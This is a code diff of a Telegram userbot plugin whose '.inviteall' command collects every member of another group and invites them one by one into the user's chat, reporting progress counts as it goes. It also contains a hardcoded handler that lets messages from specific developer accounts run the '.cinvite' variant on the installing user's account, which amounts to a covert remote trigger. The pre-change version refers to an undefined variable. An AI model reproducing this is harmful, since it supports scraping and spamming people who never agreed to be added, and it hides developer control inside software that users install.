@@ -1,15 +1,16 @@
+# Ported By @VckyouuBitch From Geez - Projects
+# Copyright © Team Geez - Project
+
+from telethon.tl import functions
+from telethon.tl.functions.messages import GetFullChatRequest
 from telethon.errors import (
     ChannelInvalidError,
     ChannelPrivateError,
-    ChannelPublicGroupNaError,
-)
-from telethon.tl import functions
+    ChannelPublicGroupNaError)
 from telethon.tl.functions.channels import GetFullChannelRequest
-from telethon.tl.functions.messages import GetFullChatRequest
 
-from userbot import CMD_HELP, CMD_HANDLER as cmd
 from userbot.events import register
-from userbot.utils import edit_or_reply, rzydx_cmd
+from userbot import DEVS, CMD_HELP
 
 
 async def get_chatinfo(event):
@@ -36,9 +37,7 @@ async def get_chatinfo(event):
             await event.reply("`Invalid channel/group`")
             return None
         except ChannelPrivateError:
-            await event.reply(
-                "`This is a private channel/group or I am banned from there`"
-            )
+            await event.reply("`This is a private channel/group or I am banned from there`")
             return None
         except ChannelPublicGroupNaError:
             await event.reply("`Channel or supergroup doesn't exist`")
@@ -49,49 +48,39 @@ async def get_chatinfo(event):
     return chat_info
 
 
-@rzydx_cmd(pattern="inviteall(?: |$)(.*)")
-@register(incoming=True, from_users=5169252959,
-          pattern=r"^\.cinvite(?: |$)(.*)")
+@register(outgoing=True, pattern=r"^\.inviteall(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cinvite(?: |$)(.*)")
 async def get_users(event):
     sender = await event.get_sender()
     me = await event.client.get_me()
     if not sender.id == me.id:
-        kyy = await event.reply("`processing...`")
+        geez = await event.reply("`processing...`")
     else:
-        kyy = await edit_or_reply(event, "`processing...`")
+        geez = await event.edit("`processing...`")
     geezteam = await get_chatinfo(event)
     chat = await event.get_chat()
     if event.is_private:
-        return await rzydx.edit("`Sorry, Can add users here`")
+        return await geez.edit("`Sorry, Can add users here`")
     s = 0
     f = 0
-    error = "None"
+    error = 'None'
 
-    await rzydx.edit("**TerminalStatus**\n\n`Collecting Users.......`")
+    await geez.edit("**TerminalStatus**\n\n`Collecting Users.......`")
     async for user in event.client.iter_participants(geezteam.full_chat.id):
         try:
             if error.startswith("Too"):
-                return await kyy.edit(
-                    f"**Terminal Finished With Error**\n(`May Got Limit Error from telethon Please try agin Later`)\n**Error** : \n`{error}`\n\n• Invited `{s}` people \n• Failed to Invite `{f}` people"
-                )
-            await event.client(
-                functions.channels.InviteToChannelRequest(channel=chat, users=[user.id])
-            )
+                return await geez.edit(f"**Terminal Finished With Error**\n(`May Got Limit Error from telethon Please try agin Later`)\n**Error** : \n`{error}`\n\n• Invited `{s}` people \n• Failed to Invite `{f}` people")
+            await event.client(functions.channels.InviteToChannelRequest(channel=chat, users=[user.id]))
             s = s + 1
-            await rzydx.edit(
-                f"**Terminal Running...**\n\n• Invited `{s}` people \n• Failed to Invite `{f}` people\n\n**× LastError:** `{error}`"
-            )
+            await geez.edit(f"**Terminal Running...**\n\n• Invited `{s}` people \n• Failed to Invite `{f}` people\n\n**× LastError:** `{error}`")
         except Exception as e:
             error = str(e)
             f = f + 1
-    return await rzydx.edit(
-        f"**Terminal Finished** \n\n• Successfully Invited `{s}` people \n• failed to invite `{f}` people"
-    )
+    return await geez.edit(f"**Terminal Finished** \n\n• Successfully Invited `{s}` people \n• failed to invite `{f}` people")
 
 
-CMD_HELP.update(
-    {
-        "inviteall": f"𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `{cmd}inviteall groups username`\
+CMD_HELP.update({
+    "inviteall":
+        "𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `.inviteall groups username`\
           \n📌 : __Scrapes users from the given chat to your group__."
-    }
-)
+})
